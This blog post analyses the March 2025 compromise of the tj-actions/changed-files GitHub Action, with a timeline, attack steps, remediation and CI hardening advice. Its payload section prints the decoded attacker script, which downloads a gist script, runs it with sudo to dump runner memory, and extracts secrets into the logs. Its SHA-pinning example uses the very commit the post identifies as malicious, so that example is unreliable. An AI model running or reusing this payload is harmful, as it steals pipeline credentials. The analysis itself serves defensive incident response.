# The tj-actions/changed-files Security Compromise: Anatomy of a Supply Chain Attack

*Posted on March 17, 2025*

## Overview

The **tj-actions/changed-files** GitHub Action – a popular tool used in CI/CD workflows to list modified files in a commit or pull request – was recently **compromised** in a software supply chain attack. This action is integrated in over 23,000 repositories, making it a widespread dependency in DevSecOps pipelines.

The threats started Saturday, March 15, as reported on [Hacker News](https://news.ycombinator.com/item?id=43367987).

In March 2025, attackers injected malicious code into the action's repository, turning a routine workflow tool into a vector for secret theft. The incident underscores the importance of **software supply chain security** and highlights gaps that modern **Application Security Posture Management (ASPM)** aims to address.

## Timeline of the Compromise (UTC) for tj-actions

- **March 14, 2025 16:00** – An anomaly is detected by security monitors (StepSecurity Harden-Runner) when an unexpected external endpoint appears during a workflow using tj-actions/changed-files. This marks the initial compromise timeframe.
- **March 14, 2025 23:00** – Investigation reveals that **most version tags of tj-actions/changed-files have been retroactively updated to a malicious commit**. In other words, nearly all historical releases of the action were suddenly **pointing to compromised code**.
- **March 15, 2025 02:00** – Evidence emerges that the malicious action is causing **secrets to leak into build logs** on multiple public repositories. Any sensitive credentials in those CI environments may have been exposed.
- **March 15, 2025 14:00** – GitHub responds by **removing tj-actions/changed-files from the Actions marketplace**, effectively blocking workflows from using the compromised action. Organizations begin urgent remediation.
- **March 15, 2025 22:00** – The GitHub repository is **restored to a safe state**. All version tags are reverted to code without the malicious payload. Maintainers and the community start to assess damage and recovery steps.

Previous vulnerable Version: V1 -> V45 are all deemed to be compromised.

Despite having the version now corrected by GitHub and sanitized, it is essential to verify if you have the previous version installed and check the GitHub action log.

![Clean Version Screenshot](https://phoenix.security/media/Screenshot-2025-03-16-at-11.19.33%E2%80%AFAM-1200x731.jpg.webp)

*This is a clean version*

![Compromised Version Screenshot](https://phoenix.security/media/Screenshot-2025-03-16-at-8.51.15%E2%80%AFAM-1200x541.png.webp)

## Verify Impacted Files

To audit all the repos that have been executing and to test, you can run [this script](https://github.com/cyberkartik/tj-actions-test/blob/main/tj-action-search-phoenix-V2.py).

Clone the repo https://github.com/cyberkartik/tj-actions-test to check if there are matches.

For Security Clients there is a version with automatic upload of results: [phoenix-V2-with-upload.py](https://github.com/Security-Phoenix-demo/tj-actions-test/blob/main/tj-action-search-phoenix-V2-with-upload.py)

## Where to Check

Action logs should be reviewed for evidence of compromise.

An example of a leaked secret:

![Leaked Secret Example](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdzgxCiAc32JFfCeT1Q1NX9mYmnZ5t8eIsXLaVcVXzXegfedBmoNp8gtT5JXdMwDCkN2D0bxXIMboXR1MPvgSV_CBq-p1BLY-q8ZM6mNtOsBusa7rVmVvQh3CjGWTc2asz5KQ76PQ?key=0oRamfDERFkcpNUZDmxhqTt8)

## How Does the Attack Work

![Attack Flow Diagram](https://phoenix.security/media/Screenshot-2025-03-16-at-3.40.56%E2%80%AFPM-1200x713.png.webp)

### Attack Steps of the tj-actions/changed-files Compromise

1. **Gain Access to the Repository**
   - The attacker obtained **write access** to the tj-actions/changed-files repository.
   - This access was likely achieved by compromising the **Personal Access Token (PAT)** of the @tj-actions-bot account.
   - GitHub has not determined exactly how the PAT was stolen.

2. **Introduce a Malicious Commit**
   - The attacker **spoofed a Renovate bot commit**, making it look like a routine dependency update.
   - The commit was **orphaned** (not attached to main or any other active branch), reducing visibility.
   - The commit was **unsigned and unverified**, but many users don't check commit signatures.

3. **Retagging Existing Versions to Point to Malicious Code**
   - The attacker **moved multiple historical version tags** (e.g., v1.0.0, v35.7.7, etc.) to point to the **malicious commit SHA**.
   - This caused **all workflows referencing any of these tags** to unknowingly fetch the compromised version.
   - Many users assume **Git tags are immutable**, but in reality, they can be overwritten by someone with write access.

4. **Modify the Action to Fetch an Additional Malicious Script**
   - The attacker modified the action's code to **download an external Python script** from gist.githubusercontent.com.
   - This script contained **base64-encoded obfuscated payloads** to evade simple detection.
   - The use of GitHub Gists instead of external servers may have delayed detection.

5. **Execute the Malicious Script to Extract Secrets**
   - The downloaded script **dumped memory from the GitHub Actions runner** by targeting the Runner.Worker process.
   - The script **used regex-based pattern matching** to search for secrets, API tokens, and credentials.
   - Extracted secrets were **base64-encoded** and **printed to the workflow logs**.

6. **Leverage Public Logs Instead of Direct Exfiltration**
   - Instead of sending the stolen secrets to an external server, the attacker relied on **public repository logs**.
   - Anyone monitoring GitHub logs could access these exposed secrets.
   - This unusual approach suggests the attack may have been **targeting specific high-profile public repositories**.

7. **Potential Exploitation via Auto-Merging Workflows**
   - Some repositories had **automated PR merging enabled** for dependency updates (e.g., Renovate bot auto-merging PRs).
   - This could have allowed **automatic execution of the compromised action** without direct human review.

8. **GitHub Takes Action to Mitigate the Attack**
   - GitHub detected the attack and **removed the tj-actions/changed-files repository** from the Actions marketplace.
   - The repository was later restored, with **all malicious versions removed**.
   - The @tj-actions-bot account had its **password reset, PAT revoked, and authentication upgraded to passkey security**.
   - GitHub flagged the affected organization to **prevent further exploitation**.

## How to Prevent Similar Attacks

1. [GitHub has a feature that lets you allow-list GitHub actions](https://docs.github.com/en/organizations/managing-organization-settings/disabling-or-limiting-github-actions-for-your-organization#allowing-select-actions-and-reusable-workflows-to-run) so you can ensure it won't run, even if it's still in your code.
2. Remove tj-actions/changed-files from the list of GitHub Actions.
3. Go to GitHub settings and configure it appropriately at: https://github.com/your-org/your-repo/settings/actions
4. Generally, pin all GitHub Actions to specific commit SHAs (rather than version tags) you know are safe. In this case, it appears that all versions were compromised.

## Audit Past Workflow Runs

Audit past workflow runs for signs of compromise. Check logs for suspicious outbound network requests. Prioritize repos where your CI runner logs are public, as secrets are dumped to stdout in the payload.

## Timeline of Attack

This fast-moving timeline shows how quickly a supply chain attack can unfold, impacting thousands of projects within hours. The speed demonstrates how crucial it is to have monitoring and rapid response capabilities in place.

## Attack Vector & Exploit Analysis

The compromise was executed via a direct repo breach rather than a vulnerability in the code. **Attackers gained write access to the tj-actions/changed-files repository**, likely by compromising the maintainer's account or CI pipeline or acting as legitimate maintainers. Unlike the [xz supply chain attack](https://phoenix.security/cve-2024-3094/), this one was less obfuscated and more direct.

The attackers **spoofed the identity of a Renovate bot in the commit** metadata, using a commit message typical of Renovate ("chore(deps): lock file maintenance"). This fake Renovate commit was an orphan (not part of the main branch), subtly obfuscating the change. Notably, the commit was unsigned/unverified, but many users do not routinely check commit signatures for third-party actions.

Note: All these tags now point to the same malicious commit hash:0e58ed8671d6b60d0890c21b07f8835ace038e67, indicating the retroactive compromise of multiple versions:

```
$ git tag -l | while read -r tag ; do git show –format="$tag: %H" –no-patch $tag ; done | sort -k2
v1.0.0: 0e58ed8671d6b60d0890c21b07f8835ace038e67
…
v35.7.7-sec: 0e58ed8671d6b60d0890c21b07f8835ace038e67
…
v44.5.1: 0e58ed8671d6b60d0890c21b07f8835ace038e67
…
v5: 0e58ed8671d6b60d0890c21b07f8835ace038e67
…
```

[@salolivares](https://github.com/salolivares) identified the malicious commit that introduces the exploit code in the Action:
https://github.com/tj-actions/changed-files/commit/0e58ed8671d6b60d0890c21b07f8835ace038e67

Once the malicious code was in the repository, the attackers **retroactively retagged many existing release versions** to point to this new malicious commit. Workflows that referenced a specific version tag (e.g., v35.7.0) now inadvertently pulled in the compromised code. Many teams assume that git tags (especially version tags following SemVer) are immutable, but in reality, tags can be moved if an attacker has push access.

### Malicious Payload

The injected code was designed to **exfiltrate secrets from the CI environment**. The payload cleverly dumped secrets to the build log itself rather than contacting an external server. **It executed a script that scanned the memory of the runner process (targeting the Runner.Worker process)** to locate sensitive data, and then printed those secrets to the job's standard output.

The base64 encoded string in the screenshots contains the exploit code. Here is the base64 decoded version of the code:

```bash
if [[ "$OSTYPE" == "linux-gnu" ]]; then
  B64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0`
  echo $B64_BLOB
else
  exit 0
fi
```
(credit: StepSecurity for the initial decode)

The compromised action added a step that uses curl and python3 to download and execute a memory-dumping script from a GitHub gist. This script scans the GitHub Actions runner's memory for secrets and prints any findings to the build log.

The **exploit payload** appeared to target common CI secrets – GitHub tokens, cloud provider keys, or other credentials stored in memory. It leveraged low-level access: by running with appropriate permissions on the GitHub-hosted runner, the malicious code could invoke system utilities (sudo, memory inspection tools) to read another process's memory space.

All harvested secrets were then printed to the job log. StepSecurity investigators confirmed that **numerous repositories had secrets appearing in their Actions logs as a result of this payload**.

It's worth noting that this was **not the first security issue involving tj-actions/changed-files**. A prior vulnerability (CVE-2023-51664) was disclosed for this Action, which allowed an attacker to inject arbitrary commands by crafting file names in a pull request.

## Supply Chain Security Risks Exposed

This incident highlights several **software supply chain security** risks associated with third-party GitHub Actions and open-source dependencies:

- **Compromised CI Components = Compromised Pipeline:** Using a third-party action in your workflow is effectively running someone else's code in your CI environment. The malicious tj-actions/changed-files had **full access to the CI runner's context**, including secrets and filesystem.

- **Secrets Exposure in Public Repositories:** Many GitHub Actions workflows run on public repositories with logs that are world-readable. **Any credentials exposed in a public Actions log are effectively compromised**.

- **Retroactive Tampering with Version Tags:** Perhaps the most alarming aspect was the attacker's ability to **retroactively modify release tags** to point to the malicious code. Most CI configurations pin Actions by a version tag, but this practice proved insufficient as tags were manipulated.

- **Widespread Impact Due to Reuse:** The popularity of tj-actions/changed-files (tens of thousands of repositories) amplified the blast radius. One compromise cascaded into many victims.

In summary, a malicious GitHub Action is just as dangerous as a malicious library in your application. It can undermine your entire CI/CD **security posture**.

## Real-World Consequences for DevSecOps Teams

- **Immediate Incident Response:** Organizations relying on the affected Action had to react swiftly. Any secrets that may have been exposed in build logs must be considered compromised.

- **Pipeline Disruption:** GitHub's removal of the action meant that any workflow using tj-actions/changed-files would fail to run thereafter.

- **Trust Erosion:** If you had trust in actions, now is the time to revisit them. For organizations with credentials exposed, immediate key rotation is necessary.

## Other Similar Supply Chain Attacks

- **Codecov Bash Uploader (2021):** Attackers breached a popular CI tool's script, modifying it to siphon off CI environment variables (including secrets) to a remote server.

- **SolarWinds Orion Build (2020):** In a notorious nation-state supply chain attack, SolarWinds' build pipeline was compromised.

- **Travis CI Secrets Leak (2021):** A vulnerability in Travis CI exposed secret environment variables from forked PR builds.

## Detection & Remediation Strategies

When a supply chain attack like this comes to light, **detecting whether your organization is affected** is the first priority:

1. **Identify Usage of the Compromised Action:**
   ```bash
   git grep -R "tj-actions/changed-files" .
   ```
   On GitHub, you can use advanced code search queries to find `uses: tj-actions/changed-files` in workflow YAML files.

2. **Halt and Replace the Malicious Action:** Immediately **stop using tj-actions/changed-files** in all workflows. Use GitHub's organization security settings to **temporarily block the action** across the org.

3. **Assess Exposure – Audit Logs and Runs:** Review recent workflow run logs for any suspicious output or behavior. Look for signs of the exploit – e.g., references to gist.githubusercontent.com or unusual blocks of base64 text in logs.

4. **Rotate Secrets Immediately:** If you discover that any sensitive values were printed in logs or could have been accessed by the malicious action, **rotate those secrets without delay**.

## Best Practices for Securing GitHub Actions

In the wake of this incident, DevSecOps teams should strengthen their processes around third-party GitHub Actions and CI/CD security in general. Here are some best practices to consider adopting (if not already in place):

## Pin Actions to Specific Commit SHAs

Instead of using floating version tags (or even version numbers) for actions, pin them to a specific commit hash. For example:

```yaml
uses: tj-actions/changed-files@0e58ed8671d6b60d0890c21b07f8835ace038e67
```

Using the full commit SHA ensures you know exactly which code is being pulled. Tags can be moved, but a commit hash reference will only pull that exact revision. Many security experts recommend this as a defense against tag tampering.

> **Note:** You must still verify out-of-band that the commit in question is safe. In this incident, pinning to a commit wouldn’t have helped if you pinned one of the compromised commits – but it would have prevented your workflow from unknowingly drifting to a different commit masquerading behind a tag.  
>  
> To manage this, you might maintain an internal list of approved commit SHAs for third-party actions.

## Verify Integrity and Signatures

Whenever possible, use actions from sources that support signed releases or checksum verification. Some GitHub Actions allow you to verify a GPG signature on the downloaded action code.

Additionally, GitHub has introduced mechanisms like digest hashes for Docker container actions to ensure you pull what you expect. While not all third-party actions support this yet, pushing the ecosystem towards signed commits/tags (perhaps via [Sigstore’s Cosign](https://docs.sigstore.dev/cosign/overview) for actions) is a worthwhile goal for supply chain security.

## Use GitHub Actions Allow-Listing

GitHub Enterprise customers can restrict which actions are allowed to run in their organization or repository. By maintaining an allow-list of trusted action sources (e.g., only actions from your own org or verified publishers), you can reduce the chance of an unvetted action running.

If an action isn’t on the approved list, GitHub will refuse to execute it. This can be a lifesaver for preventing the usage of unknown or compromised actions.

> **Tip:** This requires curating the allow-list actively. You need to inventory and decide on all third-party actions your workflows use. An automated query or tool can help enumerate these.

## Principle of Least Privilege for Workflows

Ensure your CI workflows and actions run with the minimal permissions needed. GitHub Actions allows fine-grained control over permissions granted to the `GITHUB_TOKEN` and can even restrict external network access.

For example, if an action only needs read access to the repo and no ability to push code or write to issues, scope the token accordingly.

> In this incident, a read-only token wouldn’t stop secrets from being read from memory, but it could limit lateral movement. The malicious code couldn’t, for instance, create issues or push code to other repos using the GitHub API if the token lacked those scopes.

Also, consider adding egress restrictions on self-hosted runners or using tools to restrict unexpected outbound calls.

## Monitor and Sandbox Runner Behavior

Implement proactive security monitoring for your CI runners. The fact that StepSecurity’s [Harden-Runner](https://stepsecurity.io/docs/harden-runner) detected an unusual network endpoint (the external gist URL) highlights the value of runtime monitoring.

Tools like Harden-Runner monitor network traffic, file system access, and process execution in real-time. If an action suddenly tries to do something outside its normal scope (e.g., open an internet connection to an unknown host or read protected memory), these tools can alert or block the behavior.

> Similarly, some organizations run CI jobs in isolated containers or VMs with `seccomp` or AppArmor profiles to limit syscalls like `ptrace` (which could stop a memory-dumping attempt).

Utilizing ASPM tools and services that continuously watch the posture and behavior of your pipelines can provide early warnings of a supply chain attack in progress.

## Regular Dependency Audits (Including Actions)

Just as you regularly run `npm audit` or check for CVEs in application libraries, do the same for GitHub Actions and CI/CD dependencies. Subscribe to notifications for security advisories on the GitHub Actions you use.

There is now a published CVE (e.g., **CVE-2025-30066**) for this incident – ensure you have a process to become aware of such advisories.

> **Application Security Posture Management (ASPM)** means continuously evaluating the security posture of not only your application code but also your pipeline code and configurations.

Use automated tools that flag vulnerable actions or detect maintainership changes (which could indicate risk).

## Practice Incident Response Drills for CI/CD

This compromise is a reminder that teams should have a response plan for CI/CD incidents. Conduct drills or tabletop exercises:

- What if our build pipeline was compromised?
- Do we know all the secrets that could be affected?
- Can we rebuild runner machines from scratch?

Ensure secrets used in CI are scoped to minimize damage if leaked (e.g., use short-lived credentials or service accounts with limited permissions specifically for CI).

> Having backups or the ability to revert to earlier known-good versions of actions or pipeline configurations can speed up recovery.

---

Implementing these best practices creates **multiple layers of defense**. No single measure is foolproof – pinning to a commit doesn’t help if that commit itself is bad, and allow-listing won’t catch an allowed action that later turns malicious. **Defense-in-depth is key**.

The goal is to raise the cost for attackers and to increase the likelihood of detecting malicious activity before it causes harm. Software supply chain security is an evolving field – we must evolve our strategies in tandem.

# Investigate and Scan Open-Source Projects Regardless of Their Origin

This incident serves as a wake-up call. DevSecOps teams should take this opportunity to proactively investigate their exposure and tighten the security of their open-source supply chain.

## Audit Your Open-Source Dependencies

Conduct a thorough audit of all third-party components in your build and deployment processes, including:

- GitHub Actions
- Build scripts
- Docker images
- Package dependencies
- Compiler tools

Catalog them and assess their trustworthiness. Are they actively maintained? Do they have a history of security issues? Supply chain ASPM tools can help maintain an up-to-date inventory and risk profile.

## Use Static Analysis and SAST Tools

Leverage static analysis to detect insecure configurations or risky patterns in CI/CD code. For example:

- Use Semgrep or similar SAST tools to scan workflows for anti-patterns (e.g., unpinned actions, overly broad permissions).
- Write custom rules to flag usage of certain actions.
- Extend GitHub’s own CodeQL to analyze configuration as code.

Open-source projects often provide canned queries to detect dangerous setups in GitHub workflows.

## Integrate Runtime Monitoring in CI

Just as we monitor production systems, consider monitoring CI runtime:

- Route runner outbound traffic through a proxy and log it.
- Use solutions like Harden-Runner to detect anomalies.

If a build container suddenly tries to connect to a GitHub Gist or an unknown IP, you want to know. Modern ASPM encourages visibility across every phase of development – CI pipelines included.

## Educate and Involve Your Team

Security is a team sport. Share lessons from this incident with developers, DevOps engineers, and SREs. Encourage a culture where adding a new GitHub Action triggers a security review.

Provide guidelines for vetting new dependencies:

- Is the action widely used?
- Is the author reputable?
- Is the code open and reviewed?

Encourage open-source security contributions – contribute fixes or improvements to the actions your team uses.

---

By following these practices, you create **resilient CI/CD environments** that can detect, respond to, and prevent supply chain threats before they cause significant impact.
```
